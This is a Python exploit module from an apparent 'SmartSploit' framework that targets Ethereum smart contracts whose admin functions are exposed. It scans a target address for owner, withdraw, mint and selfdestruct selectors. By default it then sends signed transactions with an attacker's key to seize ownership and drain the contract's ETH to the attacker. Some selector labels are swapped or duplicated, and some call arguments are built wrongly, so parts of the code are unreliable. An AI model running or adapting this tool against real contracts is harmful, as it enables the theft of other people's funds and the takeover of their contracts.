"""
Function Visibility Exploit
SmartSploit Framework - Exploits incorrect function visibility modifiers
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import logging

logger = logging.getLogger(__name__)

class FunctionVisibilityExploit(BaseExploit):
    """Exploit contracts with incorrectly set function visibility"""
    
    def __init__(self):
        super().__init__()
        self.name = "Function Visibility Exploit"
        self.description = "Exploits public/external functions that should be private/internal"
        self.author = "SmartSploit Team"
        
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "SWC-100: Function Default Visibility",
                "https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/",
                "Function visibility best practices"
            ],
            severity="high",
            targets=["Contracts with public admin functions", "Unprotected state changes", "Legacy contracts"]
        )
        
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Target contract address"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ATTACKER_KEY": {"value": "", "required": True, "description": "Attacker's private key"},
            "FUNCTION_SELECTOR": {"value": "", "required": False, "description": "Specific function to target"},
            "SCAN_DEPTH": {"value": "20", "required": False, "description": "Number of function signatures to scan"},
            "GAS_LIMIT": {"value": "500000", "required": False, "description": "Transaction gas limit"},
            "AUTO_EXPLOIT": {"value": "true", "required": False, "description": "Automatically exploit found functions"}
        }
        
    def check_requirements(self) -> bool:
        required_options = ["TARGET_CONTRACT", "RPC_URL", "ATTACKER_KEY"]
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
        return True
        
    def discover_public_functions(self, w3, contract_address: str) -> dict:
        """Discover potentially vulnerable public functions"""
        try:
            logger.info("Scanning for public functions...")
            
            # Common dangerous function signatures that should be private
            dangerous_functions = {
                "0x8da5cb5b": "owner()",
                "0x13af4035": "setOwner(address)",
                "0xf2fde38b": "transferOwnership(address)",
                "0x715018a6": "renounceOwnership()",
                "0xa6f9dae1": "changeOwner(address)",
                "0x893d20e8": "setAdmin(address)",
                "0x704b6c02": "setAdmin(address)",
                "0xe30c3978": "pendingOwner()",
                "0x3ccfd60b": "withdraw()",
                "0xe941fa78": "emergencyWithdraw()",
                "0x2e1a7d4d": "withdraw(uint256)",
                "0x51cff8d9": "withdrawAll()",
                "0x853828b6": "withdraw(address)",
                "0x441a3e70": "changeAdmin(address)",
                "0x8f32d59b": "isOwner()",
                "0x9623609d": "addOwner(address)",
                "0x173825d9": "removeOwner(address)",
                "0x0e18b681": "selfDestruct()",
                "0x83197ef0": "selfDestruct(address)",
                "0x7df73e27": "setBalance(uint256)",
                "0xa9059cbb": "transfer(address,uint256)",
                "0x095ea7b3": "approve(address,uint256)",
                "0x40c10f19": "mint(address,uint256)",
                "0x9dc29fac": "burn(uint256)",
                "0x42966c68": "burn(address,uint256)"
            }
            
            discovered = {
                "contract": contract_address,
                "vulnerable_functions": [],
                "dangerous_functions": [],
                "total_checked": 0,
                "risk_score": 0
            }
            
            # Test each dangerous function
            for selector, name in dangerous_functions.items():
                try:
                    # Try to call the function (read-only)
                    result = w3.eth.call({
                        'to': contract_address,
                        'data': selector
                    })
                    
                    # If call succeeds, function exists and is public
                    if result:
                        discovered["vulnerable_functions"].append({
                            "selector": selector,
                            "name": name,
                            "returns_data": len(result) > 0,
                            "risk_level": self._assess_function_risk(name)
                        })
                        
                        if "owner" in name.lower() or "admin" in name.lower():
                            discovered["dangerous_functions"].append(name)
                            discovered["risk_score"] += 30
                        elif "withdraw" in name.lower() or "transfer" in name.lower():
                            discovered["dangerous_functions"].append(name)
                            discovered["risk_score"] += 25
                        else:
                            discovered["risk_score"] += 10
                            
                    discovered["total_checked"] += 1
                    
                except Exception as e:
                    # Function doesn't exist or call failed
                    discovered["total_checked"] += 1
                    continue
                    
            return discovered
            
        except Exception as e:
            logger.error(f"Function discovery failed: {e}")
            return {"error": str(e)}
            
    def _assess_function_risk(self, function_name: str) -> str:
        """Assess the risk level of a function"""
        high_risk_keywords = ["owner", "admin", "selfdestruct", "withdraw", "mint", "burn"]
        medium_risk_keywords = ["transfer", "approve", "set"]
        
        name_lower = function_name.lower()
        
        if any(keyword in name_lower for keyword in high_risk_keywords):
            return "critical"
        elif any(keyword in name_lower for keyword in medium_risk_keywords):
            return "high"
        else:
            return "medium"
            
    def attempt_ownership_takeover(self, w3, contract_address: str, functions: list) -> dict:
        """Attempt to take over contract ownership"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            takeover_results = []
            
            # Look for ownership change functions
            ownership_functions = [f for f in functions if any(keyword in f["name"].lower() 
                                 for keyword in ["setowner", "transferownership", "changeowner", "setadmin"])]
            
            for func in ownership_functions:
                try:
                    logger.info(f"Attempting to call {func['name']}...")
                    
                    # Create transaction data
                    if "address" in func["name"]:
                        # Function takes address parameter
                        call_data = func["selector"] + attacker_account.address[2:].zfill(64)
                    else:
                        # Function takes no parameters
                        call_data = func["selector"]
                        
                    txn = {
                        'to': contract_address,
                        'data': call_data,
                        'gas': int(self.options["GAS_LIMIT"]["value"]),
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(attacker_account.address),
                        'value': 0
                    }
                    
                    signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                    
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                    
                    takeover_results.append({
                        "function": func["name"],
                        "selector": func["selector"],
                        "success": receipt.status == 1,
                        "tx_hash": tx_hash.hex(),
                        "gas_used": receipt.gasUsed
                    })
                    
                    if receipt.status == 1:
                        logger.info(f"Successfully called {func['name']}!")
                        
                        # Verify ownership change
                        try:
                            owner_result = w3.eth.call({
                                'to': contract_address,
                                'data': "0x8da5cb5b"  # owner()
                            })
                            
                            if owner_result:
                                owner_address = Web3.to_checksum_address(owner_result[-20:])
                                takeover_results[-1]["new_owner"] = owner_address
                                takeover_results[-1]["ownership_gained"] = owner_address.lower() == attacker_account.address.lower()
                        except:
                            pass
                            
                except Exception as e:
                    takeover_results.append({
                        "function": func["name"],
                        "success": False,
                        "error": str(e)
                    })
                    
            return {"takeover_attempts": takeover_results}
            
        except Exception as e:
            logger.error(f"Ownership takeover failed: {e}")
            return {"error": str(e)}
            
    def attempt_fund_drainage(self, w3, contract_address: str, functions: list) -> dict:
        """Attempt to drain funds from contract"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            # Get initial balances
            initial_contract_balance = w3.eth.get_balance(contract_address)
            initial_attacker_balance = w3.eth.get_balance(attacker_account.address)
            
            drainage_results = []
            
            # Look for withdrawal functions
            withdrawal_functions = [f for f in functions if any(keyword in f["name"].lower() 
                                  for keyword in ["withdraw", "transfer", "drain", "emergency"])]
            
            for func in withdrawal_functions:
                try:
                    logger.info(f"Attempting to call {func['name']}...")
                    
                    # Create transaction data based on function signature
                    if "uint256" in func["name"]:
                        # Function takes amount parameter - try contract balance
                        amount = hex(initial_contract_balance)[2:].zfill(64)
                        call_data = func["selector"] + amount
                    elif "address" in func["name"]:
                        # Function takes address parameter
                        call_data = func["selector"] + attacker_account.address[2:].zfill(64)
                    else:
                        # Function takes no parameters
                        call_data = func["selector"]
                        
                    txn = {
                        'to': contract_address,
                        'data': call_data,
                        'gas': int(self.options["GAS_LIMIT"]["value"]),
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(attacker_account.address),
                        'value': 0
                    }
                    
                    signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                    
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                    
                    # Check balance changes
                    final_contract_balance = w3.eth.get_balance(contract_address)
                    final_attacker_balance = w3.eth.get_balance(attacker_account.address)
                    
                    funds_drained = initial_contract_balance - final_contract_balance
                    attacker_gain = final_attacker_balance - initial_attacker_balance
                    
                    drainage_results.append({
                        "function": func["name"],
                        "selector": func["selector"],
                        "success": receipt.status == 1,
                        "tx_hash": tx_hash.hex(),
                        "gas_used": receipt.gasUsed,
                        "funds_drained": Web3.from_wei(funds_drained, 'ether'),
                        "attacker_gain": Web3.from_wei(attacker_gain, 'ether')
                    })
                    
                    if receipt.status == 1 and funds_drained > 0:
                        logger.info(f"Successfully drained {Web3.from_wei(funds_drained, 'ether')} ETH!")
                        
                except Exception as e:
                    drainage_results.append({
                        "function": func["name"],
                        "success": False,
                        "error": str(e)
                    })
                    
            return {"drainage_attempts": drainage_results}
            
        except Exception as e:
            logger.error(f"Fund drainage failed: {e}")
            return {"error": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            contract_address = self.options["TARGET_CONTRACT"]["value"]
            
            # Discover vulnerable functions
            discovery_result = self.discover_public_functions(w3, contract_address)
            if "error" in discovery_result:
                return {"result": ExploitResult.ERROR, "message": f"Function discovery failed: {discovery_result['error']}"}
                
            if not discovery_result["vulnerable_functions"]:
                return {"result": ExploitResult.FAILED, "message": "No vulnerable public functions found"}
                
            result = {
                "result": ExploitResult.SUCCESS,
                "message": f"Found {len(discovery_result['vulnerable_functions'])} vulnerable functions",
                "discovery": discovery_result,
                "exploitation_results": {}
            }
            
            # Auto-exploit if enabled
            if self.options["AUTO_EXPLOIT"]["value"].lower() == "true":
                logger.info("Auto-exploiting vulnerable functions...")
                
                # Attempt ownership takeover
                takeover_result = self.attempt_ownership_takeover(w3, contract_address, discovery_result["vulnerable_functions"])
                result["exploitation_results"]["ownership_takeover"] = takeover_result
                
                # Attempt fund drainage
                drainage_result = self.attempt_fund_drainage(w3, contract_address, discovery_result["vulnerable_functions"])
                result["exploitation_results"]["fund_drainage"] = drainage_result
                
                # Check if any exploitation was successful
                takeover_success = any(attempt.get("success") for attempt in takeover_result.get("takeover_attempts", []))
                drainage_success = any(attempt.get("success") for attempt in drainage_result.get("drainage_attempts", []))
                
                if takeover_success or drainage_success:
                    result["message"] = "Function visibility exploit successful!"
                    logger.info("Function visibility exploitation completed successfully")
                else:
                    result["message"] = "Vulnerable functions found but exploitation failed"
                    
            return result
            
        except Exception as e:
            logger.error(f"Function visibility exploit failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}